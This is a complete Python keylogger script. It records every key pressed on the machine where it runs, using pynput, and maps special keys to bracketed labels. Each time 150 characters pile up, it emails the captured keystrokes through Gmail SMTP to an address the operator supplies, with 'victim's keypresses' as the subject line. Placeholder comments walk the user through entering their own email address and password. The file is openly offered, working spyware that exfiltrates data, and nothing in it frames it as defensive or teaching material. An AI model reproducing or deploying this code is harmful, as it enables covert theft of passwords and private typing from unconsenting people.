#Python version 3.11.2
from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keystrokes = ""

def log_happykey(key):
    global keystrokes
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = '[SPACE]'
    elif key == 'Key.enter':
        key = '[ENTER]'
    elif key == 'Key.shift':
        key = '[SHIFT]'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    elif key == 'Key.tab':
        key = '[TAB]'
    elif key == 'Key.esc':
        key = '[ESC]'
    elif key == 'Key.ctrl':
        key = '[CTRL]'
    elif key == 'Key.alt':
        key = '[ALT]'
    elif key == 'Key.cmd':
        key = '[CMD]'
    elif key == 'Key.caps_lock':
        key = '[CAPS LOCK]'
    elif key == 'Key.delete':
        key = '[DELETE]'
    elif key == 'Key.up':
        key = '[UP ARROW]'
    elif key == 'Key.down':
        key = '[DOWN ARROW]'
    elif key == 'Key.left':
        key = '[LEFT ARROW]'
    elif key == 'Key.right':
        key = '[RIGHT ARROW]'
    elif key == 'Key.f1':
        key = '[F1]'
    elif key == 'Key.f2':
        key = '[F2]'
    elif key == 'Key.f3':
        key = '[F3]'
    elif key == 'Key.f4':
        key = '[F4]'
    elif key == 'Key.f5':
        key = '[F5]'
    elif key == 'Key.f6':
        key = '[F6]'
    elif key == 'Key.f7':
        key = '[F7]'
    elif key == 'Key.f8':
        key = '[F8]'
    elif key == 'Key.f9':
        key = '[F9]'
    elif key == 'Key.f10':
        key = '[F10]'
    elif key == 'Key.f11':
        key = '[F11]'
    elif key == 'Key.f12':
        key = '[F12]'
    elif key == 'Key.insert':
        key = '[INSERT]'
    elif key == 'Key.home':
        key = '[HOME]'
    elif key == 'Key.end':
        key = '[END]'
    elif key == 'Key.page_up':
        key = '[PAGE UP]'
    elif key == 'Key.page_down':
        key = '[PAGE DOWN]'
    elif key == 'Key.print_screen':
        key = '[PRINT SCREEN]'
    elif key == 'Key.scroll_lock':
        key = '[SCROLL LOCK]'
    elif key == 'Key.pause':
        key = '[PAUSE]'
    elif key == 'Key.num_lock':
        key = '[NUM LOCK]'
    elif key == 'Key.insert':
        key = '[INSERT]'
    elif key == 'Key.media_next':
        key = '[MEDIA NEXT]'
    elif key == 'Key.media_previous':
        key = '[MEDIA PREVIOUS]'
    elif key == 'Key.media_play_pause':
        key = '[MEDIA PLAY/PAUSE]'
    elif key == 'Key.volume_up':
        key = '[VOLUME UP]'
    elif key == 'Key.volume_down':
        key = '[VOLUME DOWN]'
    elif key == 'Key.volume_mute':
        key = '[VOLUME MUTE]'
    else:
        # If it's a regular character, just use it as is
        key = key.replace('Key.', '')
        key = key.replace(' ', '')

    keystrokes += key + '\n'


    # Check if the accumulated keystrokes reach 500, then send an email. Change this number as you like
    if len(keystrokes) >= 150:
        send_email_with_content("\n\nThis is an automated email containing the victim's keystrokes." +
                                keystrokes +
                                  "\n\nPlease do not reply to this email."+
                                  "\n\nThis email contains " + str(len(keystrokes)) + " keystrokes."
                                  )
        keystrokes = ""  #Reset keystrokes after sending the email

def send_email_with_content(content):
    from_email = "your_email@gmail.com"  # Change this to your email
    to_email = "your_email@gmail.com"  # Change this to the email on which you want to receive the keystrokes
    password = "your_google_password"  # Change this to your email password

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "victim's keypresses"
    msg.attach(MIMEText(content, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)

    server.sendmail(from_email, to_email, msg.as_string())

    server.quit()

#Start keystroke logging
with Listener(on_press=log_happykey) as l:
    l.join()
